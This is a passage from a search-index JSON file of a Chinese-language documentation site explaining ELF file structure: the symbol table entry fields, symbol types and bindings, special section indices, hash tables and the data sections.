\u7b26\u53f7\u8868\u5176\u5b9e\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u6570\u7ec4\u4e2d\u7684\u6bcf\u4e00\u4e2a\u5143\u7d20\u90fd\u662f\u4e00\u4e2a\u7ed3\u6784\u4f53\uff0c\u5177\u4f53\u5982\u4e0b  typedef   struct   { \n     Elf32_Word        st_name ; \n     Elf32_Addr        st_value ; \n     Elf32_Word        st_size ; \n     unsigned   char     st_info ; \n     unsigned   char     st_other ; \n     Elf32_Half        st_shndx ;  }   Elf32_Sym ;   \u6bcf\u4e2a\u5b57\u6bb5\u7684\u542b\u4e49\u5982\u4e0b     \u5b57\u6bb5  \u8bf4\u660e      st_name  \u7b26\u53f7\u5728\u5b57\u7b26\u4e32\u8868\u4e2d\u5bf9\u5e94\u7684\u7d22\u5f15\u3002\u5982\u679c\u8be5\u503c\u975e 0\uff0c\u5219\u5b83\u8868\u793a\u4e86\u7ed9\u51fa\u7b26\u53f7\u540d\u7684\u5b57\u7b26\u4e32\u8868\u7d22\u5f15\uff0c\u5426\u5219\u7b26\u53f7\u8868\u9879\u6ca1\u6709\u540d\u79f0\u3002  \u6ce8\uff1a\u5916\u90e8  C  \u7b26\u53f7\u5728 C \u8bed\u8a00\u548c\u76ee\u6807\u6587\u4ef6\u7684\u7b26\u53f7\u8868\u4e2d\u5177\u6709\u76f8\u540c\u7684\u540d\u79f0\u3002    st_value  \u7ed9\u51fa\u4e0e\u7b26\u53f7\u76f8\u5173\u8054\u7684\u6570\u503c\uff0c\u5177\u4f53\u53d6\u503c\u4f9d\u8d56\u4e8e\u4e0a\u4e0b\u6587\uff0c\u53ef\u80fd\u662f\u4e00\u4e2a\u6b63\u5e38\u7684\u6570\u503c\u3001\u4e00\u4e2a\u5730\u5740\u7b49\u7b49\u3002    st_size  \u7ed9\u51fa\u5bf9\u5e94\u7b26\u53f7\u6240\u5360\u7528\u7684\u5927\u5c0f\u3002\u5982\u679c\u7b26\u53f7\u6ca1\u6709\u5927\u5c0f\u6216\u8005\u5927\u5c0f\u672a\u77e5\uff0c\u5219\u6b64\u6210\u5458\u4e3a0\u3002    st_info  \u7ed9\u51fa\u7b26\u53f7\u7684\u7c7b\u578b\u548c\u7ed1\u5b9a\u5c5e\u6027\u3002\u4e4b\u540e\u4f1a\u7ed9\u51fa\u82e5\u5e72\u53d6\u503c\u548c\u542b\u4e49\u7684\u7ed1\u5b9a\u5173\u7cfb\u3002    st_other  \u76ee\u524d\u4e3a0\uff0c\u5176\u542b\u4e49\u6ca1\u6709\u88ab\u5b9a\u4e49\u3002    st_shndx  \u5982\u679c\u7b26\u53f7\u5b9a\u4e49\u5728\u8be5\u6587\u4ef6\u4e2d\uff0c\u90a3\u4e48\u8be5\u6210\u5458\u4e3a\u7b26\u53f7\u6240\u5728\u8282\u5728\u8282\u533a\u5934\u90e8\u8868\u4e2d\u7684\u4e0b\u6807\uff1b\u5982\u679c\u7b26\u53f7\u4e0d\u5728\u672c\u76ee\u6807\u6587\u4ef6\u4e2d\u56fd\uff0c\u6216\u8005\u5bf9\u4e8e\u67d0\u4e9b\u7279\u6b8a\u7684\u7b26\u53f7\uff0c\u8be5\u6210\u5458\u5177\u6709\u4e00\u4e9b\u7279\u6b8a\u542b\u4e49\u3002     \u5176\u4e2d\uff0c\u7b26\u53f7\u8868\u4e2d\u4e0b\u6807 0 \u5b58\u50a8\u4e86\u7b26\u53f7\u8868\u7684\u4e00\u4e2a\u5143\u7d20\uff0c\u540c\u65f6\u8fd9\u4e2a\u5143\u7d20\u4e5f\u76f8\u5bf9\u6bd4\u8f83\u7279\u6b8a\uff0c\u4f5c\u4e3a\u6240\u6709\u672a\u5b9a\u4e49\u7b26\u53f7\u7684\u7d22\u5f15\uff0c\u5177\u4f53\u5982\u4e0b     \u540d\u79f0  \u53d6\u503c  \u8bf4\u660e      st_name  0  \u65e0\u540d\u79f0    st_value  0  0 \u503c    st_size  0  \u65e0\u5927\u5c0f    st_info  0  \u65e0\u7c7b\u578b\uff0c\u5c40\u90e8\u7ed1\u5b9a    st_other  0  \u65e0\u9644\u52a0\u4fe1\u606f    st_shndx  0  \u65e0\u8282\u533a", 
            "title": "\u6982\u8ff0"
        }, 
        {
            "location": "/executable/elf/elf_structure/#st_value", 
            "text": "\u5728 Linux \u7684 ELF \u6587\u4ef6\u4e2d\uff0c\u5177\u4f53\u8bf4\u660e\u5982\u4e0b   \u8be5\u7b26\u53f7\u5bf9\u5e94\u7740\u4e00\u4e2a\u53d8\u91cf\uff0c\u90a3\u4e48\u8868\u660e\u8be5\u53d8\u91cf\u5728\u5185\u5b58\u4e2d\u7684\u504f\u79fb\u3002\u6211\u4eec\u53ef\u7531\u8fd9\u4e2a\u503c\u83b7\u53d6\u5176\u6587\u4ef6\u504f\u79fb  \u83b7\u53d6\u8be5\u7b26\u53f7\u5bf9\u5e94\u7684  st_shndx \uff0c\u8fdb\u800c\u83b7\u53d6\u5230\u76f8\u5173\u7684\u8282\u533a\u3002  \u6839\u636e\u8282\u533a\u5934\u5143\u7d20\u53ef\u4ee5\u83b7\u53d6\u8282\u533a\u7684\u865a\u62df\u57fa\u5730\u5740\u548c\u6587\u4ef6\u57fa\u5730\u5740\u3002  value-\u5185\u5b58\u57fa\u865a\u62df\u5730\u5740=\u6587\u4ef6\u504f\u79fb-\u6587\u4ef6\u57fa\u5730\u5740    \u8be5\u7b26\u53f7\u5bf9\u5e94\u7740\u4e00\u4e2a\u51fd\u6570\uff0c\u90a3\u4e48\u8868\u660e\u8be5\u51fd\u6570\u5728\u6587\u4ef6\u4e2d\u7684\u8d77\u59cb\u5730\u5740\u3002", 
            "title": "st_value"
        }, 
        {
            "location": "/executable/elf/elf_structure/#st_info", 
            "text": "st_info \u4e2d\u5305\u542b\u7b26\u53f7\u7c7b\u578b\u548c\u7ed1\u5b9a\u4fe1\u606f\uff0c\u8fd9\u91cc\u7ed9\u51fa\u4e86\u63a7\u5236\u5b83\u7684\u503c\u7684\u65b9\u5f0f\u5177\u4f53\u4fe1\u606f\u5982\u4e0b  #define ELF32_ST_TYPE(i)    ((i) 0xf)\n#define ELF32_ST_INFO(b, t) (((b) 4) + ((t) 0xf))", 
            "title": "st_info"
        }, 
        {
            "location": "/executable/elf/elf_structure/#symbol-type", 
            "text": "\u53ef\u4ee5\u770b\u51fa st_info \u7684\u4f4e 4 \u4f4d\u8868\u793a\u7b26\u53f7\u7684\u7c7b\u578b\uff0c\u5177\u4f53\u5b9a\u4e49\u5982\u4e0b     \u540d\u79f0  \u53d6\u503c  \u8bf4\u660e      STT_NOTYPE  0  \u7b26\u53f7\u7684\u7c7b\u578b\u6ca1\u6709\u5b9a\u4e49\u3002    STT_OBJECT  1  \u7b26\u53f7\u4e0e\u67d0\u4e2a\u6570\u636e\u5bf9\u8c61\u76f8\u5173\uff0c\u6bd4\u5982\u4e00\u4e2a\u53d8\u91cf\u3001\u6570\u7ec4\u7b49\u7b49\u3002    STT_FUNC  2  \u7b26\u53f7\u4e0e\u67d0\u4e2a\u51fd\u6570\u6216\u8005\u5176\u4ed6\u53ef\u6267\u884c\u4ee3\u7801\u76f8\u5173\u3002    STT_SECTION  3  \u7b26\u53f7\u4e0e\u67d0\u4e2a\u8282\u533a\u76f8\u5173\u3002\u8fd9\u79cd\u7c7b\u578b\u7684\u7b26\u53f7\u8868\u9879\u4e3b\u8981\u7528\u4e8e\u91cd\u5b9a\u4f4d\uff0c\u901a\u5e38\u5177\u6709 STB_LOCAL \u7ed1\u5b9a\u3002    STT_FILE  4  \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u7b26\u53f7\u7684\u540d\u79f0\u7ed9\u51fa\u4e86\u751f\u6210\u8be5\u76ee\u6807\u6587\u4ef6\u76f8\u5173\u7684\u6e90\u6587\u4ef6\u7684\u540d\u79f0\u3002\u5982\u679c\u5b58\u5728\u7684\u8bdd\uff0c\u8be5\u7b26\u53f7\u5177\u6709 STB_LOCAL  \u7ed1\u5b9a\uff0c\u5176\u8282\u533a\u7d22\u5f15\u662f SHN_ABS \u4e14\u4f18\u5148\u7ea7\u6bd4\u5176\u4ed6 STB_LOCAL \u7b26\u53f7\u9ad8\u3002    STT_LOPROC \uff5e STT_HIPROC  13~15  \u4fdd\u7559\u7528\u4e8e\u7279\u5b9a\u5904\u7406\u5668     \u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u51fd\u6570\u7b26\u53f7\u6709\u6bd4\u8f83\u7279\u6b8a\uff0c\u5f53\u53e6\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u4ece\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u5f15\u7528\u4e00\u4e2a\u51fd\u6570\u65f6\uff0c\u94fe\u63a5\u5668\u81ea\u52a8\u4e3a\u88ab\u5f15\u7528\u7b26\u53f7\u521b\u5efa\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u3002\u5171\u4eab\u76ee\u6807\u4e2d\u9664\u4e86 STT_FUNC  \uff0c \u5176\u5b83\u7b26\u53f7\u5c06\u4e0d\u4f1a\u901a\u8fc7\u8fc7\u7a0b\u94fe\u63a5\u8868\u81ea\u52a8\u88ab\u5f15\u7528\u3002  \u5982\u679c\u4e00\u4e2a\u7b26\u53f7\u7684\u503c\u6307\u5411\u8282\u5185\u7684\u7279\u5b9a\u4f4d\u7f6e\uff0c\u5219\u5b83\u7684\u8282\u7d22\u5f15\u53f7  st_shndx \uff0c\u5305\u542b\u4e86\u5b83\u5728\u8282\u5934\u8868\u4e2d\u7684\u7d22\u5f15\u3002\u5f53\u4e00\u4e2a\u8282\u5728\u91cd\u5b9a\u4f4d\u8fc7\u7a0b\u4e2d\u79fb\u52a8\u65f6\uff0c\u8be5\u7b26\u53f7\u503c\u4e5f\u505a\u76f8\u5e94\u6539\u53d8\uff0c\u5bf9\u8be5\u7b26\u53f7\u7684\u5f15\u7528\u7ee7\u7eed\u6307\u5411\u7a0b\u5e8f\u4e2d\u7684\u76f8\u540c\u4f4d\u7f6e\u3002\u6709\u4e9b\u7279\u5b9a\u8282\u7d22\u5f15\u503c\u5177\u6709\u5176\u4ed6\u8bed\u4e49\u3002", 
            "title": "Symbol Type"
        }, 
        {
            "location": "/executable/elf/elf_structure/#symbol-binding", 
            "text": "\u6839\u636e  #define ELF32_ST_BIND(i)    ((i) 4)  \u53ef\u4ee5\u770b\u51fa st_info \u7684\u9ad8 4 \u4f4d\u8868\u793a\u7b26\u53f7\u7ed1\u5b9a\u7684\u4fe1\u606f\u3002\u800c\u8fd9\u90e8\u5206\u4fe1\u606f\u786e\u5b9a\u4e86\u7b26\u53f7\u7684\u94fe\u63a5\u53ef\u89c1\u6027\u4ee5\u53ca\u5176\u884c\u4e3a\uff0c\u5177\u4f53\u7684\u53d6\u503c\u5982\u4e0b     \u540d\u79f0  \u53d6\u503c  \u8bf4\u660e      STB_LOCAL  0  \u8868\u660e\u8be5\u7b26\u53f7\u4e3a\u5c40\u90e8\u7b26\u53f7\uff0c\u5728\u5305\u542b\u8be5\u7b26\u53f7\u5b9a\u4e49\u7684\u76ee\u6807\u6587\u4ef6\u4ee5\u5916\u4e0d\u53ef\u89c1\u3002\u76f8\u540c\u540d\u79f0\u7684\u5c40\u90e8\u7b26\u53f7\u53ef\u4ee5\u5b58\u5728\u4e8e\u591a\u4e2a\u6587\u4ef6\u4e2d\uff0c\u4e92\u4e0d\u5f71\u54cd\u3002    STB_GLOBAL  1  \u8868\u660e\u8be5\u7b26\u53f7\u4e3a\u5168\u5c40\u7b26\u53f7\uff0c\u5bf9\u6240\u6709\u5c06\u88ab\u7ec4\u5408\u5728\u4e00\u8d77\u7684\u76ee\u6807\u6587\u4ef6\u90fd\u662f\u53ef\u89c1\u7684\u3002\u4e00\u4e2a\u6587\u4ef6\u4e2d\u5bf9\u67d0\u4e2a\u5168\u5c40\u7b26\u53f7\u7684\u5b9a\u4e49\u5c06\u6ee1\u8db3\u53e6\u4e00\u4e2a\u6587\u4ef6\u5bf9\u76f8\u540c\u5168\u5c40\u7b26\u53f7\u7684\u672a\u5b9a\u4e49\u5f15\u7528\u3002\u6211\u4eec\u79f0\u521d\u59cb\u5316\u975e\u96f6\u53d8\u91cf\u7684\u5168\u5c40\u7b26\u53f7\u4e3a\u5f3a\u7b26\u53f7\uff0c\u53ea\u80fd\u5b9a\u4e49\u4e00\u6b21\u3002    STB_WEAK  2  \u5f31\u7b26\u53f7\u4e0e\u5168\u5c40\u7b26\u53f7\u7c7b\u4f3c\uff0c\u4e0d\u8fc7\u5b83\u4eec\u7684\u5b9a\u4e49\u4f18\u5148\u7ea7\u6bd4\u8f83\u4f4e\u3002    STB_LOPROC  ~STB_HIPROC  13  \u8fd9\u4e2a\u8303\u56f4\u7684\u53d6\u503c\u662f\u4fdd\u7559\u7ed9\u5904\u7406\u5668\u4e13\u7528\u8bed\u4e49\u7684\u3002     \u5728\u6bcf\u4e2a\u7b26\u53f7\u8868\u4e2d\uff0c\u6240\u6709\u5177\u6709 STB_LOCAL \u7ed1\u5b9a\u7684\u7b26\u53f7\u90fd\u4f18\u5148\u4e8e\u5f31\u7b26\u53f7\u548c\u5168\u5c40\u7b26\u53f7\u3002\u7b26\u53f7\u8868\u8282\u533a\u4e2d\u7684 sh_info \u9879\u6240\u5bf9\u5e94\u7684\u5934\u90e8\u7684\u6210\u5458\u5305\u542b\u7b2c\u4e00\u4e2a\u975e\u5c40\u90e8\u7b26\u53f7\u7684\u7b26\u53f7\u8868\u7d22\u5f15\u3002  \u6b64\u5916\uff0c\u5168\u5c40\u7b26\u53f7\u4e0e\u5f31\u7b26\u53f7\u7684\u4e3b\u8981\u533a\u522b\u5982\u4e0b\uff1a   \u5f53\u94fe\u63a5\u5668\u5728\u94fe\u63a5\u591a\u4e2a\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u65f6\uff0c\u4e0d\u5141\u8bb8\u5b9a\u4e49\u591a\u4e2a\u76f8\u540c\u540d\u5b57\u7684  STB_GLOBAL  \u7b26\u53f7\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u5982\u679c\u5b58\u5728\u4e00\u4e2a\u5df2\u5b9a\u4e49\u5168\u5c40\u7b26\u53f7\uff0c\u5219\u540c\u540d\u7684\u5f31\u7b26\u53f7\u7684\u5b58\u5728\u4e0d\u4f1a\u5f15\u8d77\u9519\u8bef\u3002\u94fe\u63a5\u5668\u4f1a\u4f18\u5148\u9009\u62e9\u5168\u5c40\u5b9a\u4e49\uff0c\u5ffd\u7565\u5f31\u7b26\u53f7\u5b9a\u4e49\u3002\u7c7b\u4f3c\u7684\uff0c\u5982\u679c\u4e00\u4e2a\u516c\u5171\u7b26\u53f7\u5b58\u5728( st_shndx \u57df\u4e3a SHN_COMMON \u7684\u7b26\u53f7)\uff0c\u5219\u540c\u540d\u7684\u5f31\u7b26\u53f7\u7684\u5b58\u5728\u4e0d\u4f1a\u5f15\u8d77\u9519\u8bef\u3002\u94fe\u63a5\u5668\u4f1a\u9009\u62e9\u516c\u5171\u5b9a\u4e49\uff0c\u5ffd\u7565\u5f31\u7b26\u53f7\u5b9a\u4e49\u3002  \u5f53\u94fe\u63a5\u5668\u5bfb\u627e\u6587\u4ef6\u5e93\u65f6\uff0c\u5b83\u4f1a\u63d0\u53d6\u5305\u542b\u672a\u5b9a\u4e49\u5168\u5c40\u7b26\u53f7\u7684\u6210\u5458\uff0c\u53ef\u80fd\u662f\u4e00\u4e2a\u5168\u5c40\u7b26\u53f7\u6216\u8005\u5f31\u7b26\u53f7\u3002\u94fe\u63a5\u5668\u4e0d\u4f1a\u4e3a\u4e86\u89e3\u51b3\u672a\u5b9a\u4e49\u7684\u5f31\u7b26\u53f7\u95ee\u9898\u800c\u63d0\u53d6\u6587\u4ef6\uff0c\u672a\u5b9a\u4e49\u7684\u5f31\u7b26\u53f7\u7684\u503c\u4e3a0\u3002", 
            "title": "Symbol Binding"
        }, 
        {
            "location": "/executable/elf/elf_structure/#_13", 
            "text": "\u4e0d\u540c\u7684\u76ee\u6807\u6587\u4ef6\u7c7b\u578b\u5bf9\u7b26\u53f7\u8868\u9879\u4e2d st_value \u6210\u5458\u7684\u89e3\u91ca\u4e0d\u540c\uff1a   \u5728\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u4e2d\uff0cst_value \u4fdd\u5b58\u4e86\u8282\u533a\u7d22\u5f15\u4e3a SHN_COMMON \u7684\u7b26\u53f7\u7684\u5bf9\u9f50\u7ea6\u675f\u3002  \u5728\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u4e2d\uff0cst_value \u4fdd\u5b58\u4e86\u5df2\u5b9a\u4e49\u7b26\u53f7\u7684\u8282\u533a\u504f\u79fb\u3002\u4e5f\u5c31\u662f\u8bf4\uff0cst_value\u4fdd\u7559\u4e86st_shndx \u6240\u6807\u8bc6\u7684\u8282\u533a\u7684\u5934\u90e8\u5230\u7b26\u53f7\u4f4d\u7f6e\u7684\u504f\u79fb\u3002  \u5728\u53ef\u6267\u884c\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\uff0cst_value \u5305\u542b\u4e00\u4e2a\u865a\u5730\u5740\u3002\u4e3a\u4e86\u4f7f\u5f97\u8fd9\u4e9b\u6587\u4ef6\u7684\u7b26\u53f7\u5bf9\u52a8\u6001\u94fe\u63a5\u5668\u66f4\u6709\u7528\uff0c\u8282\u533a\u504f\u79fb\uff08\u9488\u5bf9\u6587\u4ef6\u7684\u89e3\u91ca\uff09\u7ed9\u51fa\u4e86\u4e0e\u8282\u533a\u53f7\u65e0\u5173\u7684\u865a\u62df\u5730\u5740\uff08\u9488\u5bf9\u5185\u5b58\u7684\u89e3\u91ca\uff09\u3002   \u7b26\u53f7\u8868\u53d6\u503c\u5728\u4e0d\u540c\u7684\u76ee\u6807\u6587\u4ef6\u4e2d\u5177\u6709\u76f8\u4f3c\u7684\u542b\u4e49\uff0c\u53ef\u4ee5\u6709\u9002\u5f53\u7684\u7a0b\u5e8f\u53ef\u4ee5\u91c7\u53d6\u9ad8\u6548\u7684\u65b9\u6cd5\u6765\u8bbf\u95ee\u6570\u636e\u3002", 
            "title": "\u7b26\u53f7\u53d6\u503c"
        }, 
        {
            "location": "/executable/elf/elf_structure/#st_shndx", 
            "text": "\u7279\u6b8a\u7684\u7d22\u5f15\u53ca\u5176\u610f\u4e49\u5982\u4e0b   SHN_ABS\uff1a \u7b26\u53f7\u7684\u53d6\u503c\u5177\u6709\u7edd\u5bf9\u6027\uff0c\u4e0d\u4f1a\u56e0\u4e3a\u91cd\u5b9a\u4f4d\u800c\u53d1\u751f\u53d8\u5316\u3002  SHN_COMMON\uff1a  \u7b26\u53f7\u6807\u8bb0\u4e86\u4e00\u4e2a\u5c1a\u672a\u5206\u914d\u7684\u516c\u5171\u5757\u3002\u7b26\u53f7\u7684\u53d6\u503c\u7ed9\u51fa\u4e86\u5bf9\u9f50\u7ea6\u675f\uff0c\u4e0e\u8282\u533a\u7684 sh_addralign \u6210\u5458\u7c7b\u4f3c\u3002\u5c31\u662f\u8bf4\uff0c\u94fe\u63a5\u7f16\u8f91\u5668\u5c06\u5728\u5730\u5740\u4f4d\u4e8e st_value \u7684\u500d\u6570\u5904\u4e3a\u7b26\u53f7\u5206\u914d\u7a7a\u95f4\u3002\u7b26\u53f7\u7684\u5927\u5c0f\u7ed9\u51fa\u4e86\u6240\u9700\u8981\u7684\u5b57\u8282\u6570\u3002  SHN_UNDEF\uff1a  \u6b64\u7d22\u5f15\u503c\u8868\u793a\u7b26\u53f7\u6ca1\u6709\u5b9a\u4e49\u3002\u5f53\u94fe\u63a5\u7f16\u8f91\u5668\u5c06\u6b64\u76ee\u6807\u6587\u4ef6\u4e0e\u5176\u4ed6\u5b9a\u4e49\u4e86\u8be5\u7b26\u53f7\u7684\u76ee\u6807\u6587\u4ef6\u8fdb\u884c\u7ec4\u5408\u65f6\uff0c\u6b64\u6587\u4ef6\u4e2d\u5bf9\u8be5\u7b26\u53f7\u7684\u5f15\u7528\u5c06\u88ab\u94fe\u63a5\u5230\u5b9e\u9645\u5b9a\u4e49\u7684\u4f4d\u7f6e\u3002", 
            "title": "st_shndx"
        }, 
        {
            "location": "/executable/elf/elf_structure/#_14", 
            "text": "\u90a3\u4e48\u5bf9\u4e8e\u4e00\u4e2a\u7b26\u53f7\u6765\u8bf4\u5982\u4f55\u5b9a\u4f4d\u5176\u5bf9\u5e94\u5b57\u7b26\u4e32\u7684\u5730\u5740\u5462\uff1f\u5177\u4f53\u6b65\u9aa4\u5982\u4e0b   \u6839\u636e Section Header Table \u4e2d\u7b26\u53f7\u8282\u5934\u4e2d\u7684  sh_link  \u83b7\u53d6\u8be5\u7b26\u53f7\u8282\u4e2d\u5bf9\u5e94\u7b26\u53f7\u5b57\u7b26\u4e32\u8282\u5728  Section Header Table  \u4e2d\u7684\u4e0b\u6807\u3002\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u53d6\u5bf9\u5e94\u7b26\u53f7\u8282\u7684\u5730\u5740\u3002  \u6839\u636e\u8be5\u7b26\u53f7\u7684\u5b9a\u4e49\u4e2d\u7684 st_name \u83b7\u53d6\u8be5\u7b26\u53f7\u7684\u504f\u79fb\uff0c\u5373\u5728\u5bf9\u5e94\u7b26\u53f7\u8282\u4e2d\u7684\u504f\u79fb\u3002  \u6839\u636e\u4e0a\u8ff0\u4e24\u8005\u5c31\u53ef\u4ee5\u5b9a\u4f4d\u4e00\u4e2a\u7b26\u53f7\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u7684\u5730\u5740\u4e86\u3002", 
            "title": "\u5982\u4f55\u5b9a\u4f4d"
        }, 
        {
            "location": "/executable/elf/elf_structure/#gnuhash", 
            "text": "\u6ce8\uff1a\u672c\u90e8\u5206\u4e3b\u8981\u53c2\u8003https://blogs.oracle.com/ali/gnu-hash-elf-sections\u3002  \u5728 ELF \u826f\u597d\u5730\u53ef\u6269\u5c55\u6027\u7684\u5e2e\u52a9\u4e0b\uff0c GNU \u4e3a ELF \u5bf9\u8c61\u6dfb\u52a0\u4e86\u4e00\u4e2a\u65b0\u7684\u54c8\u5e0c\u8282\uff0c\u8fd9\u4e2a\u8282\u7684\u6027\u80fd\u76f8\u6bd4\u4e8e\u539f\u6709\u7684  SYSV hash  \u4f1a\u597d\u5f88\u591a\u3002\u8be5\u8282\u7528\u4e8e\u5feb\u901f\u6839\u636e\u7b26\u53f7\u540d\u83b7\u53d6\u5bf9\u5e94\u7b26\u53f7\u8868\u4e2d\u7684\u7d22\u5f15\u3002  \u66f4\u591a\u5185\u5bb9\u8bf7\u53c2\u8003  https://blogs.oracle.com/ali/entry/gnu_hash_elf_sections \u3002  \u6709\u5f85\u8fdb\u4e00\u6b65\u5b66\u4e60\u3002", 
            "title": ".gnu.hash"
        }, 
        {
            "location": "/executable/elf/elf_structure/#elf_1", 
            "text": "ELF\u6587\u4ef6\u4e2d\u7684\u54c8\u5e0c\u8868\u7531 Elf32_Word \u5bf9\u8c61\u6784\u6210\uff0c\u7528\u6765\u652f\u6301\u7b26\u53f7\u8868\u8bbf\u95ee\u3002\u4e0b\u9762\u7684\u7b26\u53f7\u53ef\u4ee5\u7528\u6765\u8f85\u52a9\u89e3\u91ca\u7b26\u53f7\u8868\u7684\u7ec4\u7ec7\u60c5\u51b5\uff0c\u4f46\u662f\u4ed6\u4eec\u5e76\u4e0d\u662f ELF \u6587\u4ef6\u8bf4\u660e\u7684\u4e00\u90e8\u5206\u3002   bucket\u6570\u7ec4\u5305\u542b\u4e86nbucket\u4e2a\u5143\u7d20\uff0cchain\u6570\u7ec4\u5305\u542b\u4e86nchain\u4e2a\u5143\u7d20\uff0c\u6240\u6709\u7684\u6570\u7ec4\u7684\u4e0b\u6807\u90fd\u662f\u4ee50\u5f00\u59cb\u3002bucket\u548cchain\u90fd\u5305\u542b\u7b26\u53f7\u8868\u7d22\u5f15\u3002chain\u6570\u7ec4\u4e2d\u7684\u5143\u7d20\u662f\u548c\u7b26\u53f7\u8868\u4e2d\u7684\u5143\u7d20\u4e00\u4e00\u5bf9\u5e94\u7684\uff0c\u56e0\u6b64\u7b26\u53f7\u8868\u7684\u5143\u7d20\u4e2a\u6570\u5fc5\u987b\u548cnchain\u7684\u5927\u5c0f\u76f8\u540c\uff0c\u6545\u800c\u7b26\u53f7\u8868\u7684\u7d22\u5f15\u540c\u6837\u53ef\u4ee5\u4f5c\u4e3achain\u8868\u7684\u7d22\u5f15\u3002\u4e0b\u9762\u5c55\u793a\u7684\u54c8\u5e0c\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u7b26\u53f7\u540d\u4f5c\u4e3a\u8f93\u5165\uff0c\u7136\u540e\u8fd4\u56de\u4e00\u4e2a\u503c\uff0c\u8fd9\u4e2a\u503c\u53ef\u80fd\u88ab\u7528\u4e8e\u8ba1\u7b97bucket\u7684\u7d22\u5f15\u3002\u56e0\u6b64\uff0c\u5982\u679c\u54c8\u5e0c\u51fd\u6570\u9488\u5bf9\u4e8e\u67d0\u4e2a\u540d\u5b57\u8fd4\u56de\u503cx\uff0c\u90a3\u4e48 bucket[x%nbucket]  \u7ed9\u51fa\u4e86\u4e00\u4e2a\u7d22\u5f15y\uff0c\u53ef\u4ee5\u7528\u6765\u7d22\u5f15\u7b26\u53f7\u8868\uff0c\u4e5f\u53ef\u4ee5\u7528\u6765\u7d22\u5f15chain\u8868\u3002\u5982\u679c\u7b26\u53f7\u8868\u7684\u5bf9\u5e94\u7d22\u5f15\u5e76\u4e0d\u662f\u6240\u60f3\u8981\u7684\u54ea\u4e00\u4e2a\uff0c\u90a3\u4e48chain[y]\u5c31\u4f1a\u7ed9\u51fa\u7ed9\u51fa\u540c\u4e00\u4e2a\u54c8\u5e0c\u503c\u7684\u4e0b\u4e00\u4e2a\u7b26\u53f7\u8868\u4e2d\u8868\u9879\u7684\u4f4d\u7f6e\uff0c\u5373\u53ef\u4ee5\u7528\u6765\u9632\u6b62\u51fa\u73b0\u54c8\u5e0c\u503c\u4e00\u6837\u7684\u60c5\u51b5\u3002\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u8ddf\u7740chain\u94fe\u4e00\u76f4\u641c\u7d22\u76f4\u5230\u9047\u5230\u6240\u60f3\u8981\u7684\u7b26\u53f7\uff0c\u6216\u8005\u9047\u5230\u503c\u4e3a STN_UNDEF  \u7684chain\u7684\u8868\u9879\u3002", 
            "title": "ELF \u6807\u51c6"
        }, 
        {
            "location": "/executable/elf/elf_structure/#data-related-sections", 
            "text": "", 
            "title": "Data Related Sections"
        }, 
        {
            "location": "/executable/elf/elf_structure/#bss-section", 
            "text": "\u672a\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\u5bf9\u5e94\u7684\u8282\u3002\u6b64\u8282\u533a\u4e0d\u5360\u7528 ELF \u6587\u4ef6\u7a7a\u95f4\uff0c\u4f46\u5360\u7528\u7a0b\u5e8f\u7684\u5185\u5b58\u6620\u50cf\u4e2d\u7684\u7a7a\u95f4\u3002\u5f53\u7a0b\u5e8f\u5f00\u59cb\u6267\u884c\u65f6\uff0c\u7cfb\u7edf\u5c06\u628a\u8fd9\u4e9b\u6570\u636e\u521d\u59cb\u5316\u4e3a 0\u3002bss\u5176\u5b9e\u662fblock started by symbol\u7684\u7b80\u5199\uff0c\u8bf4\u660e\u8be5\u8282\u533a\u4e2d\u5355\u7eaf\u5730\u8bf4\u660e\u4e86\u6709\u54ea\u4e9b\u53d8\u91cf\u3002", 
            "title": "BSS Section"
        }, 
        {
            "location": "/executable/elf/elf_structure/#data-section", 
            "text": "\u8fd9\u4e9b\u8282\u533a\u5305\u542b\u521d\u59cb\u5316\u4e86\u7684\u6570\u636e\uff0c\u4f1a\u5728\u7a0b\u5e8f\u7684\u5185\u5b58\u6620\u50cf\u4e2d\u51fa\u73b0\u3002", 
            "title": ".data Section"
        }, 
        {
            "location": "/executable/elf/elf_structure/#rodata-section", 
            "text": "\u8fd9\u4e9b\u8282\u533a\u5305\u542b\u53ea\u8bfb\u6570\u636e\uff0c\u8fd9\u4e9b\u6570\u636e\u901a\u5e38\u53c2\u4e0e\u8fdb\u7a0b\u6620\u50cf\u7684\u4e0d\u53ef\u5199\u6bb5\u3002", 
            "title": ".rodata Section"
        }, 
        {
            "location": "/executable/elf/elf_structure/#common-code-section", 
            "text": "", 
            "title": "Common Code Section"
        }, 
        {
            "location": "/executable/elf/elf_structure/#_15", 
            "text": "\u5728\u52a8\u6001\u94fe\u63a5\u5668\u521b\u5efa\u4e86\u8fdb\u7a0b\u955c\u50cf\uff0c\u5e76\u4e14\u6267\u884c\u4e86\u91cd\u5b9a\u4f4d\u540e\uff0c\u6bcf\u4e00\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u90fd\u6709\u673a\u4f1a\u53bb\u6267\u884c\u4e00\u4e9b\u521d\u59cb\u5316\u7684\u4ee3\u7801\u3002\u6240\u6709\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4f1a\u5728\u53ef\u6267\u884c\u6587\u4ef6\u83b7\u5f97\u6743\u9650\u4e4b\u524d\u8fdb\u884c\u521d\u59cb\u5316\u3002  \u5728\u8c03\u7528\u76ee\u6807\u6587\u4ef6 A \u7684\u521d\u59cb\u5316\u4ee3\u7801\u4e4b\u524d\uff0c\u4f1a\u9996\u5148\u8c03\u7528\u6240\u6709 A 